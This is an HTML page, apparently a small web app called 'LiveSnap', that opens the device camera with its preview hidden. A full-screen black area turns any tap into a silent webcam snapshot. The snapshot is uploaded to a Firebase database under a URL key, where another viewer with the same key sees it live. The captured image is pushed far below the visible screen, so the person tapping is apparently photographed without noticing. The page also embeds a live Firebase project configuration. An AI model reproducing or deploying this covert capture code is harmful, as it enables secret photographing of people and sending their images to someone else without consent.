<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>LiveSnap View + Capture</title>
  <style>
    body {
      background: black;
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      overflow-y: scroll;
      min-height: 300vh;
      color: white;
    }
    #captureArea {
      height: 100vh;
      width: 100vw;
    }
    #spacer {
      height: 150vh;
    }
    #result {
      text-align: center;
      padding: 20px;
    }
    #livePhoto {
      width: 90%;
      max-width: 400px;
      margin-top: 20px;
      border: 2px solid white;
    }
  </style>
</head>
<body>
  <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
  <div id="spacer"></div>

  <div id="result">
    <h3>Captured Photo:</h3>
    <img id="livePhoto" src="" alt="Waiting for photo..." />
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
      authDomain: "livesnap-d57c2.firebaseapp.com",
      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "livesnap-d57c2",
      storageBucket: "livesnap-d57c2.firebasestorage.app",
      messagingSenderId: "24202813286",
      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
      measurementId: "G-BR9MFH2XN6"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const params = new URLSearchParams(window.location.search);
    const key = params.get("key");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const img = document.getElementById('livePhoto');

    if (!key) {
      document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>No key provided in URL (use ?key=yourkey)</h2>";
      throw new Error("Key not provided");
    }

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      video.srcObject = stream;
    });

    function capture() {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg");

      db.ref("livephoto/" + key).set({
        image: dataUrl,
        time: Date.now()
      });
    }

    db.ref("livephoto/" + key).on("value", snapshot => {
      const data = snapshot.val();
      if (data && data.image) {
        img.src = data.image;
      }
    });
  </script>
</body>
</html>
